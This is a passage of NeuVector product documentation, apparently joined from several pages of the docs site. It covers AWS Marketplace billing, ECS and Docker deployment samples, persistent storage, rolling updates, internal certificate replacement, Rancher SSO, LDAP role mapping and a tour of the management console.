NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the AWS marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.0 or later before the backup and removal. For Helm based deployments, this is a sample Helm upgrade command (replacing account ID, IAM role name, previous helm version values file etc):  helm upgrade -n neuvector neuvector oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.4.30002023052201 --create-namespace \\ --set awsbilling.accountNumber=$AWS_ACCT_ID,awsbilling.roleName=$IAM_ROLE_NAME \\ --set awsbilling.enabled=true,containerd.enabled=true -f values-x.y.z.yaml   Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of AWS platforms (only EKS at initial July release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the AWS marketplace in order to benefit from consolidated multi-cluster billing.

This must be deployed, together with NeuVector from the AWS Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions for your region in the marketplace listing above.  The helm install command uses defaults in the values.yaml file. Important defaults to check are the manager service type (LoadBalancer) and container run-time (containerd - which is the typical default for EKS clusters). The default admin username is disabled, and users are required to set a username and password through a secret prior to deployment.  Setting the Admin Username and Password​  It is required to set the admin username and password as a Kubernetes secret prior to deployment.  kubectl create secret generic neuvector-init --from-file=userinitcfg.yaml -n neuvector   note The above step is mandatory, otherwise an admin user will not be created upon NeuVector deployment, making the NeuVector deployment unmanageable.

Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].hostname}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://a2647ecdxx33498948a70eea84c5-18386345695.us-west-2.elb.amazonaws.com:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  note The NeuVector scanner image is updated daily with a new CVE database on the NeuVector docker hub registry. It is recommended that the image path be changed to allow for automated daily updates by modifying the scanner and updater image paths AFTER successful initial deployment. For example: kubectl set image deploy/neuvector-scanner-pod neuvector-scanner-pod=docker.io/neuvector/scanner:latest kubectl set image cronjob/neuvector-updater-pod neuvector-updater-pod=docker.io/neuvector/updater:latest   ","version":"Next 🚧","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/next/deploying/awsmarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service.

However, it may provide some assistance in understanding how to deploy the Allinone on ECS.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deploy on AWS Using ECS​","type":1,"pageTitle":"Amazon ECS","url":"/next/deploying/ecs#deploy-on-aws-using-ecs","content":" This is an example of how to deploy NeuVector using ECS.  note Please see the Kubernetes examples for EKS.  Prepare several Amazon ECS instances which have the Docker engine and ECS agent containers built-in. Pick one node for the management console. Then define Security Group rules that allow inbound TCP port 8443 (NeuVector’s default management console port) for access by your client browser. Define a Security Group that allows TCP and UDP ports on 18300, 18301, 18400, 18401 . This is used by NeuVector enforcers to talk to the Controllers/Allinone. Apply this Security Group to all the ECS instances that will be deploying the NeuVector enforcers and controllers/allinone. Set an attribute on the nodes that you want to deploy NeuVector allinone or controller container. For example, if you want to run NeuVector in a controller HA mode, the recommendation is to pick at least 3 nodes then add the attribute to all of the 3 nodes.  This is how to add attributes to your ECS instances:  Select the instance, then pick “View/Edit Attributes” from the Actions drop down menu.    Then add a new attribute. For example “allinone-node” with value “true”.    Create the Allinone Task Definition. Create a new Task Definition for the Allinone container. You can use the ECS interface to manually create it or paste in the sample JSON file (see below for samples). Refer to section “1. Deploying NeuVector” of these docs for how to configure the Allinone.  Enter the placement constraint. For example, if you used the attribute labeling above, then enter this in the constraint.  attribute:allinone-node=~true     note If you examine the updated JSON file now you’ll see the placement constraint added to it.  Create a new service for the Allinone task. Set the “Placement Templates” to “One Task Per Host” so that only one Allinone/Controller can run on any host. You will also see the constraint will be used “memberOf(attribute:allinone-node=~true) which requires the node to have that attribute.    Now you can deploy the Allinone service. Set the “Number of tasks” to the desired Allinone/Controller number. Now the NeuVector Allinone or Controller containers will start running on the nodes selected. After the Allinone starts running you should be able to connect to the NeuVector console through HTTPS on port 8443. Create the Enforcer Task Definition. This is similar to the Allinone task. Configure manually through the ECS console or use the JSON sample below.  For the Enforcer placement constraint you will require that the Enforcer must NOT be on the same node as the allinone.  attribute:allinone-node!~true     Create a new service for the Enforcer task. Again, set the Task Placement to “One Task Per Host” so only one Enforcer is deployed on each host. Also note the additional constraint should show that it prevents deployment on an allinone node.    Deploy this service with desired number of enforcer nodes in “Number of tasks”. Very shortly all the enforcers will be up and running. From the NeuVector console you will be able to see all nodes being detected with enforcers.

Create a new task definition, then click Configure Via JSON at bottom. Before pasting in the json below, replace the IP address and image path (find REPLACE in samples). Typically, the IP address would be the Private IP address of the AWS Instance where the allinone will run. You can also specific a different family name than my-allinone/my-enforcer (at the bottom of json).

NeuVector’s services can be easily updated or upgraded without interrupting any running services. To do that in Amazon ECS:  If you have multiple controllers or Allinones deployed as a cluster, ignore this step. If there is only a single Allinone/controller in the system, find a new ECS instance and deploy a 2nd Allinone/controller container on it (follow the NeuVector allinone/controller ECS deployment steps). After deployed, in the NeuVector management console, you will see this new controller up and running (under Resources &gt; Controllers). This is required so that all stateful data is replicated between controllers. In ECS Services, reset and delete the old Allinone/controller service. Pull the updated NeuVector images manually or trigger AWS ECS to pull new versions of Allinone/controller containers from Dockerhub or your private registry. Create a new revision of the Allinone/Controller task, update the “CLUSTER_JOIN_ADDR” to the 2nd Allinone/controller’s private node IP address. Create a new service to deploy this new task (follow the same steps to deploy on ECS). After completed, the new version of the Allinone/controller should be up and running. From the NeuVector management console, all the logs and policies should still be there. Optionally, you can bring down the 2nd Allinone/Controller container now since there should be a Allinone/Controller now started on the original node. From ECS Services, shutdown and update the Enforcers. Manually or auto-trigger the pulling of new Enforcer images. Then restart or update the Enforcer on all nodes. From the NeuVector console, you will see all Enforcers are up to date. If you are using the separate Manager container instead of the Allinone (which already has the manager in it), simply shutdown and remove the old manager container. Then pull the new manager version, and deploy it, pointing the CLUSTER_JOIN_ADDR to the IP of the controller.  All NeuVector containers are now updated live. All policies, logs, and configurations are unaffected. The live graph view will be regenerated automatically as soon as there is new live traffic flowing between containers.

To deploy in this environment, you must use Docker Compose or Run to deploy the NeuVector containers. You can use the remote host deployment (docker-compose -H HOST) to make this task easier.  Here are the sample docker compose configuration files. Note that using docker native does not support deploying the enforcer on the same node as the controller, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Note: The environment variable NV_PLATFORM_INFO=platform=Docker is used to notify NeuVector that the platform is Docker/Swarm, even though there may be unused Kubernetes containers detected by NeuVector on a Docker EE deployment. Also to be able to see these in Network Activity -&gt; View -&gt; Show System, add the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Deploy Allinone for High Availability​  For HA in production Docker native or EE environments, deploy the Allinone container on the first three production hosts. Each Allinone should point to the IP addresses of all Allinone hosts. For example, three Allinone containers is the minimum for HA, and the CLUSTER_JOIN_ADDR should list the three IP addresses separated by comma's. Additional HA Allinone's can be deployed in odd numbers, e.g. 5, 7. The deploy the Enforcer on the remaining hosts in the cluster, in any.  Deploy Allinone using docker-compose (privileged mode)​  The following is an example of the docker-compose file to deploy the allinone container on the first node. Because the allinone container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Note: To expose the REST API in the Allinone, add the port map for 10443, for example - 10443:10443.  Add an enforcer container using docker-compose (privileged mode)​  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  Deploy the NeuVector Scanner Container​  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning. Important: Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  Sample docker run to deploy the scanner on the same host as the controller  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   To deploy the scanner on a different host than the controller, add the environment variable CLUSTER_ADVERTISED_ADDR so the controller can reach the scanner.  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=scanner_host_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   To deploy multiple scanners on the same host as the controller, remove the port mapping and CLUSTER_ADVERTISED_ADDR environment variable.  docker run -itd --name s1 -e CLUSTER_JOIN_ADDR=controller_node_ip neuvector/scanner:latest   Where s1 is scanner 1 (use s2, s3 etc for each additional scanner).  To deploy a stand alone scanner (no controller/allinone), please see the section Parallel and Standalone Scanners.  To update the Scanner in order to get the latest CVE database updates from NeuVector, create a cron job to stop and restart the scanner, pulling the latest. See this section for details.  Deployment Without Using Privileged Mode​  For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmor profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose​  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose​  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: neuvector.enforcer cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   Deploy allinone (privileged mode) with docker run​  You can use docker run instead of compose to deploy.

","version":"Next 🚧","tagName":"h3"},{"title":"Backups and Persistent Data​","type":1,"pageTitle":"Deploying NeuVector","url":"/next/deploying/production#backups-and-persistent-data","content":" Be sure to periodically export the configuration file from the console and save it as a backup.  If you run multiple controllers in an HA configuration, as long as one controller is always up, all data will be synchronized between controllers.  If you wish to save logs such as violations, threats, vulnerabilities and events please enable the SYSLOG server in Settings.  NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/ from the controller pod. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  Persistent Volume Example​  The PersistentVolume defined in the cluster is required for persistent volume support. The requirement for NeuVector is that the accessModes needs to be ReadWriteMany(RWX). Not all storage types support the RWX access mode. For example, on GKE you may need to create a RWX persistent volume using NFS storage.  Once the PersistentVolume is created, there needs to be created a PersistentVolumeClaim as below for Controller. Currently the persistent volume is used only for the NeuVector configuration backup files in the controller (Policies, Rules, user data, integrations etc) and registry scan results.  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector spec: accessModes: - ReadWriteMany volumeMode: Filesystem resources: requests: storage: 1Gi   Here is an example for IBM Cloud:  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector labels: billingType: &quot;hourly&quot; region: us-south zone: sjc03 spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi iops: &quot;100&quot; storageClassName: ibmc-file-retain-custom   After the Persistent Volume Claim is created, modify the NeuVector sample yaml file as shown below (old section commented out):  ... spec: template: spec: volumes: - name: nv-share # hostPath: // replaced by persistentVolumeClaim # path: /var/neuvector // replaced by persistentVolumeClaim persistentVolumeClaim: claimName: neuvector-data   Also add the following environment variable in the Controller or Allinone sample yamls for persistent volume support. This will make the Controller read the backup config when starting.   - name: CTRL_PERSIST_CONFIG   ConfigMaps and Persistent Storage​  Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage.  For more information see the ConfigMaps section.

You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Before starting the rolling updates, please pull and tag the NeuVector containers the same way as in the beginning of this page. You can pull the latest without a version number, but to trigger the rolling update you’ll need to tag the image with a version.  For example, for the controller (latest):  docker pull neuvector/controller   Then to tag/push, if latest version is 2.0.1, same as step 3 at the top of this page:  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag neuvector/controller docker-registry.default.svc:5000/neuvector/controller:2.0.1 docker push docker-registry.default.svc:5000/neuvector/controller:2.0.1   You can now update your yaml file with these new versions and ‘apply’, or use the ‘oc set image ...’ command to trigger the rolling update. Please see the Kubernetes rolling update samples in this Production section to how to launch and monitor rolling updates of the NeuVector containers.  The provided sample deployment yamls already configure the rolling update policy.

These certificates can be replaced by your own to further harden communication. For replacing certificates used by external access to NeuVector (i.e, browser to the Manager, or REST API to the Controller), please see this section. See below for replacing the certificates used in internal communication between NeuVector containers.  WARNING: Replacing certificates is recommended to be performed only during initial deployment of NeuVector. Replacing on a running cluster (even with rolling upgrade) may result in an unstable state where NeuVector pods are unable to communicate with each other due to a mismatch in certificates, and DATA LOSS may occur.  Replacing Certificates Used in Internal Communications of NeuVector​  Replace the internal encryption files ca.crt, tls.key, tls.crt as follows:  Create a new ca.cfg file with your favorite editor:  [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc.

Choose your scenario from the three options below:  New certificateUpdate current certificate with SANsRegenarate certificate files and add SANs If your certificate is about to expire and you need to generate a new one, follow the steps below: Delete the old ca.crt, tls.key, tls.crt, kubernetes secret, and generate new ones: kubectl delete secret internal-cert -n neuvector openssl genrsa -out ca.key 2048 openssl req -x509 -sha256 -new -nodes -key ca.key -days 3650 -out ca.crt openssl genrsa -out tls.key 2048 openssl req -new -key tls.key -sha256 -out cert.csr -config ca.cfg openssl req -in cert.csr -noout -text openssl x509 -req -sha256 -in cert.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out tls.crt -days 3650 -extensions 'v3_req' -extfile ca.cfg openssl x509 -in tls.crt -text kubectl create secret generic internal-cert -n neuvector --from-file=tls.key --from-file=tls.crt --from-file=ca.crt Then edit the Controller, Enforcer, and Scanner deployment yamls, adding: containers: - name: neuvector-controller/enforcer/scanner-pod volumeMounts: - mountPath: /etc/neuvector/certs/internal/tls.key name: internal-cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/internal/tls.crt name: internal-cert readOnly: true subPath: tls.crt - mountPath: /etc/neuvector/certs/internal/ca.crt name: internal-cert readOnly: true subPath: ca.crt volumes: - name: internal-cert secret: defaultMode: 420 secretName: internal-cert Then proceed to deploy NeuVector as before. You can also shell into the controller/enforcer/scanner pods to confirm that the ca.crt, tls.key, tls.crt files are the customized ones and that the NeuVector communications are working using the new certificates.

The default (Helm-based) NeuVector deployment will deploy NeuVector containers into the cattle-neuvector-system namespace.  Note: Only NeuVector deployments through Rancher Extensions (NeuVector) of Rancher version 2.7.0+, or Apps &amp; Marketplace of Rancher version 2.6.5+ can be managed directly (single sign on to NeuVector console) through Rancher. If adding clusters to Rancher with NeuVector already deployed, or where NeuVector has been deployed directly onto the cluster, these clusters will not be enabled for SSO integration.  NeuVector UI Extension for Rancher​  Rancher Prime customers are able to easily deploy NeuVector and the NeuVector UI Extension for Rancher. This will enable Prime users to monitor and manage certain NeuVector functions and events directly through the Rancher UI. For community users, please see the Deploy NeuVector section below to deploy from Rancher Apps and Marketplace.  The first step is to enable the Rancher Extensions capability globally if it is not already enabled. Install the NeuVector-UI-Ext from the Available list Reload the extension once installation is completed On your selected cluster, install the NeuVector application from the NeuVector tab if the NeuVector app is not already installed. This should take you to the App installation steps. For more details on this installation process, see the Deploy NeuVector section below. The NeuVector dashboard should now be shown from the NeuVector menu for that cluster. From this dashboard, a summary of the security health of the cluster can be monitored. There are interactive elements in the dashboard, such as invoking a wizard to Improve Your (Security Risk) Score, including being able to turn on automated scanning for vulnerabilities if it is not enabled.In addition, the links in the upper right of the dashboard provide convenient single sign on (SSO) links to the full NeuVector console for more detailed analysis and configuration. To uninstall the extension, go back to the Extensions pageNote: Uninstalling the NeuVector UI extension will NOT uninstall the NeuVector app from each cluster. The NeuVector menu will revert to providing an SSO link into the NeuVector console.  Deploy NeuVector​  First, find the NeuVector chart in Rancher charts, select it and review the instructions and various configuration values. (Optional) Create a project to deploy into if desired, e.g. NeuVector. Note: If you see more than one NeuVector chart, don't select the one that is for upgrading legacy NeuVector 4.x Helm chart deployments.    Deploy the NeuVector chart, first configuring appropriate values for a Rancher deployment, such as:  Container run-time, e.g. docker for RKE and containerd for RKE2, or select the K3s value if using K3s.Manager service type: change to LoadBalancer if available on public cloud deployments. If access is only desired through Rancher, any allowed value will work here. See the Important note below about changing the default admin password in NeuVector.Indicate if this cluster will be either a multi-cluster federated Primary, or remote (or select both if either option is desired).Persistent volume for configuration backups    Click 'Install' after you have reviewed and updated any chart values.  After successful NeuVector deployment, you will see a summary of the deployments, daemon sets, and cron job for NeuVector. You will also be able to see the services deployed in the Services Discovery menu on the left.    Manage NeuVector​  You will now see a NeuVector menu item in the left, and selecting that will show a NeuVector tile/button, which when clicked will take you to the NeuVector console, in a new tab.    When this Single Sign On (SSO) access method is used for the first time, a corresponding user in the NeuVector cluster is created for the Rancher user login. The same user name of the Rancher logged in user will be created in NeuVector, with a role of either admin or fedAdmin, and Identity provider as Rancher.    Note in the above screen shot, two Rancher users admin and gkosaka have been automatically created for SSO. If another user is create manually in NeuVector, the Identity provider would be listed as NeuVector, as shown below. This local user can login directly to the NeuVector console without going through Rancher.    important It is recommended to login directly to the NeuVector console as admin/admin to manually change the admin password to a strong password. This will only change the NeuVector identity provider admin user password (you may see another admin user whose identify provider is Rancher). Alternatively, include a ConfigMap as a secret in the initial deployment from Rancher (see chart values for ConfigMap settings) to set the default admin password to a strong password.  Disabling NeuVector/Rancher SSO​  To disable the ability to login to NeuVector from Rancher Manager, go to Settings -&gt; Configuration.    Rancher Legacy Deployments​  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node. See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  note Deployment on Rancher 2.x/Kubernetes should follow the Kubernetes reference section and/or Helm based deployment.  Deploy the catalog docker-compose-dist.yml, controllers will be deployed on the labelled nodes, enforcers will be deployed on the rest of nodes. (The sample file can be modified so that enforcers are only deployed to the specified nodes.) Pick one of controllers for the manager to connect to. Modify the manager's catalog file docker-compose-manager.yml, set CTRL_SERVER_IP to the controller's IP, then deploy the manager catalog.  Here are the sample compose files.

Integrations with other ecosystem partners such as Sonatype (Nexus Lifecycle), IBM Cloud (QRadar and Security Advisor), Prometheus/Grafana, are also supported. Many of these can be found on the NeuVector Github page.  The following configurations can be found in Settings:  OpenShift/Kubernetes RBACs​  Select this option if you are using Red Hat OpenShift Role Based Access Controls (RBACs) and would like NeuVector to automatically read and enforce those. If selected, OpenShift users can log into the NeuVector console using their OpenShift credentials, and will only have access to the resources (Projects, containers, nodes etc) according to their role in the OpenShift cluster. OpenShift integration uses the OAuth2 protocol.    important Do not use the setting in OpenShift AllowAllPasswordIdentityProvider which allows any password to be used to log in. This will allow a user to login into NeuVector with any password as well (as a read only user). It will also create a new user in OpenShift for every login (see ‘oc get user’ results).  note The default Admin user of NeuVector and any additional users created in NeuVector will still be active with OpenShift RBACs enabled.

With the above User name and Base DN settings, NeuVector is able to bind with Windows Active Directory successfully. Click the TEST CONNECTION to check it.    User name: It is required to use the sAMAccountName attribute ONLY to match. For example, in the screen below NeuVector is going to verify if the ituser(CN=ituser,OU=IT,DC=local,DC=nvtest,DC=com) user is able to login with NeuVector web console.  note NeuVector doesn't use the values of cn, displayName, dn, givenName, name or userPrincipalName attributes etc to verify the test user.    The last part is role mapping for NeuVector for the web console login.    In the example above, the defined group, _d_s_itgroup, in the NeuVector role must have member and sAMAccountType attributes. The value of the sAMAccountType attribute MUST be 268435456 which is the Global Security group and the login username must be in the member lists.

Dashboard​  The Dashboard shows a summary of risk scores, security events, and application protocols detected by NeuVector. It also shows details for some of these security events. PDF reports can be generated from the Dashboard which contain detailed charts and explanations.  At the top of the dashboard there is a summary of the security risks in the cluster. The wrench tool next to the overall risk score can be clicked to open a wizard which will guide you through recommended steps to reduce/improve the risk score. Mousing over each risk gauge will provide a description of it to the right and how to improve the risk score. Also see the separate documentation section Improving Security Risk Score.    Overall Security Risk Score. This is a weighted summary of the individual risk areas summarized to the right, including Service exposure, Ingress/Egress exposure, and Vulnerability exploit risks. Click on the wrench to improve the score.Service Exposure Risk Score. This is an indicator of how many services are protected by whitelist rules and running in the Monitor or Protect mode, where risk is lowest. A high ratio of services in Discover mode means these services are not segmented or isolated by whitelist rules.Ingress/Egress Risk Score. This is a weighted summary of actual threats or network violations detected on ingress or egress (out of the cluster) connections, combined with allowed ingress/egress connections. External connections which are protected by whitelist rules have lower risk but can still be attacked by embedded network attacks. Note: A list of ingress and egress IPs can be downloaded from the Ingress/Egress details section as an Exposure Report.Vulnerability Exploit Risk Score. This is the risk of exploits of vulnerabilities in running containers. Services in Discover mode with High criticality vulnerabilities will have the highest impact on the score, as they are highest risk. If services are in Monitor or Protect but still have High vulnerabilities, they are protected by network and process rules to identify (and block) suspicious activity, so will have a lower weighting on the score. A warning will be shown if the Auto-Scan button is not enabled for automatic run-time scanning.  Some of the charts are interactive, as shown below with the green arrows.    Some of the event data shown in the dashboard have limits, as described in the Reporting section.  Application Protocols Detected This chart summarizes the application protocols detected in live connections in the cluster. The category ‘Other’ means any unrecognized HTTP protocols or raw TCP connections. You can toggle between the Application Coverage and the Application Volume levels.  Application Coverage is the number of unique pod to pod conversations detected between application services. For example if service pod A connects to service pod B using HTTP that is one unique HTTP ‘conversation’, but all connections between A and B count as one conversation.Application Volume is the network activity measured in Gbytes for all services using that protocol.  Network Activity​  This provides a graphical map of your containers and the conversations between containers. It also shows connections with other local and external resources. In Monitor and Protect modes, violations are displayed with red or yellow lines to indicate that a violation has been detected.  note If a large number of containers or services are present, the view will automatically default to a namespace view (collapsed). Double click on a namespace icon to expand it.  note This display uses a local GPU if available to speed loading times. Some Windows GPUs have known issues, and the use of the GPU can be turned off in Advanced Filter window (see below for Tools).  Some of the actions possible are:  Move objects around to better view services and conversationsClick on any line (arrow) to see more detail such as protocol/port, latest time stamp, and to add or edit a rule (NOTE: both connection endpoints must be fully expanded by double clicking on each in order to see the connection details)Click on any container to see details, and the ‘i’ for real-time connections.

You can also change the overall protection mode for the service (all containers for that service) here. The expand/collapse options enable you to simplify or expand the objects.  The data in the map may take a few seconds after network activity to be displayed.  See the explanation of the Legend icons at the bottom of this page.  Assets​  Assets displays information about Platforms, Nodes, Containers, Registries, Sigstore Verifiers (used in Admission Control rules), and System Components (NeuVector Controllers, Scanners, and Enforcers).  NeuVector includes an end-to-end vulnerability management platform which can be integrated into your automated CI/CD process. Scan registries, images, and running containers and host nodes for vulnerabilities. Results for individual registries, nodes, and containers can be found here, while combined results and advanced reporting can be found in the Security Risks menu.  NeuVector also automatically runs the Docker Bench security report and Kubernetes CIS Benchmark (if applicable) on each host and running containers.  Note that the Status of all containers is shown in Assets -&gt; Containers, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Please see the section Scanning &amp; Compliance for additional details, including how to use the Jenkins plug-in NeuVector Vulnerability Scanner.  Policy​  This displays and manages the run-time Security Policy which determines what container networking, process, and file system application behavior is ALLOWED and DENIED. Any conversations and activities which are not explicitly allowed are logged as violations by NeuVector. This is also where Admission Control rules can be created.  Please see the Security Policy section of these docs for a detailed explanation of the behavior of the rules and how to edit or create rules.  Security Risks​  This enables customizable Vulnerability and Compliance management investigation, triage, and reporting. Easily research image vulnerabilities and find out which nodes or containers contain those vulnerabilities. Advanced filtering makes reviewing scan and compliance check results and provides customized reporting.  These menu's combine results from registry (image), node, and container vulnerability scans and compliance checks to enable end-to-end vulnerability management and reporting.  Notifications​  This is where you can see the logs for Security Events, Risk Reports (e.g. Scanning) and general Events. NeuVector also supports SYSLOG for integration with tools such as SPLUNK as well as webhook notifications.  Security Events  Use the search or Advanced Filter to locate specific events. The timeline widget at the top can also be adjusted using the left and right circles to change the time window. You can also easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.  NeuVector continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:  Implicit Deny Rule is Violated  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Violations detailed are captured and source IPs can be investigated further.  Other security events include privilege escalations, suspicious processes, or abnormal file system activity detected on containers or hosts.  Risk Reports  Registry scanning, run-time scanning, admission control events will be shown here. Also, CIS benchmarks and compliance checks results will be shown.  Please see the Reporting section for additional details and limits of the event displays in the console.  Settings​  Settings -&gt; Users &amp; Roles​  Add other users here. Users can be assigned an Admin role, a Read-only role, or custom role. In Kubernetes, users can be assigned one or more namespaces to access. Custom roles can also be configured here for users and Groups (e.g. LDAP/AD) to be mapped to the roles. See the users section for configuration details.  Settings -&gt; Configuration​  Configure a unique cluster name, new services mode, and other settings here.  If deploying on a Rancher or OpenShift cluster, authentication can be enabled such that Rancher users or OpenShift users can log into the NeuVector console with the associated RBACs. For Rancher users, a connecting button/link from the Rancher console allows Rancher admin's to open and access the NeuVector console directly.  The New Service Mode sets which protection mode any new services (applications) previously unknown or undefined in NeuVector will by default be set to. For production environments, it is not recommended to set this to Discover.  The Network Service Policy Mode, if enabled, applies the selected policy mode globally to the network rules for all groups, and each Group’s individual policy mode will only apply to process and file rules.  The Automated Promotion of Group Modes promotes a Group’s protection Mode automatically (from Discover to Monitor to Protect) based on elapsed time and criteria.  The Auto-Deletion of Unused Groups is 